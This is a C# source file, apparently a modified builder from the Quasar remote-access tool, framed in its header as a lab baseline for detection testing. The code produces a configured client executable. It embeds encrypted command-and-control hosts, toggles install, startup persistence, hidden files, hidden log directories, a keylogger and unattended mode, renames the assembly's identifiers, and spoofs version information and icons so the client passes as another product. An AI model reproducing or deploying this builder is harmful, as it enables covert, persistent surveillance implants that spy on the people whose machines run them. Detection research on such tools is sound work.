// ---------------------------------------------------------------------------
// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
// 作者：陈森（Chen Sen）  https://github.com/chendashi666
// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
// ---------------------------------------------------------------------------

using Mono.Cecil;
using Mono.Cecil.Cil;
using Quasar.Common.Config;
using Quasar.Common.Cryptography;
using Quasar.Common.Properties;
using Quasar.Server.Models;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Vestris.ResourceLib;

namespace Quasar.Server.Build
{
    /// <summary>
    /// Provides methods used to create a custom client executable.
    /// </summary>
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientFilePath;
        private LabConfig _labConfiguration;

        /// <summary>
        /// Laboratory metadata (internal subnet) written into the embedded and external
        /// configuration. It has no upstream consumer and never changes client behaviour.
        /// </summary>
        public string LabSubnet { get; set; }

        /// <summary>
        /// Full name of the settings type inside the client assembly, assembled at runtime from the
        /// centralized laboratory string resources instead of a hard coded literal.
        /// </summary>
        private static readonly string SettingsTypeFullName = string.Join(".", new[]
        {
            LabStrings.NamespaceRoot,
            LabStrings.ClientNamespace,
            LabStrings.ConfigNamespace,
            LabStrings.SettingsTypeName
        });

        public ClientBuilder(BuildOptions options, string clientFilePath)
        {
            _options = options;
            _clientFilePath = clientFilePath;
        }

        /// <summary>
        /// Builds a client executable.
        /// </summary>
        public void Build()
        {
            // The laboratory external configuration is computed once and used both for the
            // embedded resource and for the config.json written next to the produced client.
            _labConfiguration = LabConfigFactory.FromBuildOptions(_options);
            if (!string.IsNullOrEmpty(LabSubnet))
                _labConfiguration.Subnet = LabSubnet;

            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
            {
                // PHASE 1 - Writing settings
                WriteSettings(asmDef);

                // PHASE 1b - Embedding the laboratory external configuration so the produced
                // executable is self contained and can be delivered as a single file.
                EmbedLabConfiguration(asmDef);

                // PHASE 2 - Renaming
                Renamer r = new Renamer(asmDef);

                if (!r.Perform())
                    throw new Exception("renaming failed");

                // PHASE 3 - Saving
                r.AsmDef.Write(_options.OutputPath);
            }

            // PHASE 4 - Assembly Information changing
            if (_options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(_options.OutputPath);

                versionResource.FileVersion = _options.AssemblyInformation[7];
                versionResource.ProductVersion = _options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = _options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = _options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = _options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = _options.AssemblyInformation[5];

                versionResource.SaveTo(_options.OutputPath);
            }

            // PHASE 5 - Icon changing
            if (!string.IsNullOrEmpty(_options.IconPath))
            {
                IconFile iconFile = new IconFile(_options.IconPath);
                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                iconDirectoryResource.SaveTo(_options.OutputPath);
            }

            // PHASE 6 - Laboratory external configuration
            // Emits config.json next to the produced client so that one single build can be
            // re-pointed between experiment conditions without being rebuilt.
            WriteLabConfiguration();
        }

        /// <summary>
        /// Writes the external laboratory configuration next to the built client.
        /// An existing configuration is never overwritten, so re-running the builder does not
        /// clobber the parameters of an experiment condition.
        /// </summary>
        private void WriteLabConfiguration()
        {
            var outputPath = Path.GetFullPath(_options.OutputPath);
            var directory = Path.GetDirectoryName(outputPath);
            if (string.IsNullOrEmpty(directory))
                return;

            var configPath = Path.Combine(directory, LabConfig.FileName);
            if (File.Exists(configPath))
                return;

            _labConfiguration.SaveTo(configPath);
        }

        /// <summary>
        /// Embeds the laboratory configuration into the produced assembly. The runtime loader
        /// treats this as the base layer and an external config.json as the override layer.
        /// </summary>
        private void EmbedLabConfiguration(AssemblyDefinition asmDef)
        {
            var name = LabConfig.EmbeddedResourceName;
            var module = asmDef.MainModule;

            for (var i = module.Resources.Count - 1; i >= 0; i--)
            {
                if (module.Resources[i].Name == name)
                    module.Resources.RemoveAt(i);
            }

            var payload = Encoding.UTF8.GetBytes(_labConfiguration.ToJson());
            module.Resources.Add(new EmbeddedResource(name, ManifestResourceAttributes.Public, payload));
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert)); // export without private key, very important!

            var key = serverCertificate.Thumbprint;
            var aes = new Aes256(key);

            byte[] signature;
            // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == SettingsTypeFullName)
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Version);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);
                                            break;
                                        case 3: //installsub
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallSub);
                                            break;
                                        case 4: //installname
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.InstallName);
                                            break;
                                        case 5: //mutex
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);
                                            break;
                                        case 6: //startupkey
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.StartupName);
                                            break;
                                        case 7: //encryption key
                                            methodDef.Body.Instructions[i].Operand = key;
                                            break;
                                        case 8: //tag
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Tag);
                                            break;
                                        case 9: //LogDirectoryName
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.LogDirectoryName);
                                            break;
                                        case 10: //ServerSignature
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
                                            break;
                                        case 11: //ServerCertificate
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_1 ||
                                         methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_0) // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideFile));
                                            break;
                                        case 4: //Keylogger
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Keylogger));
                                            break;
                                        case 5: //HideLogDirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideLogDirectory));
                                            break;
                                        case 6: // HideInstallSubdirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                            break;
                                        case 7: // UnattendedMode
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4) // int
                                {
                                    //reconnectdelay
                                    methodDef.Body.Instructions[i].Operand = _options.Delay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldc_I4_S) // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(_options.InstallPath);
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Obtains the OpCode that corresponds to the bool value provided.
        /// </summary>
        /// <param name="p">The value to convert to the OpCode</param>
        /// <returns>Returns the OpCode that represents the value provided.</returns>
        private OpCode BoolOpCode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        /// <summary>
        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
        /// </summary>
        /// <param name="installPath">The integer value of the install path.</param>
        /// <returns>Returns the signed-byte value of the special folder.</returns>
        /// <exception cref="ArgumentException">Thrown if the path to the special folder was invalid.</exception>
        private sbyte GetSpecialFolder(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                case 3:
                    return (sbyte)Environment.SpecialFolder.System;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}
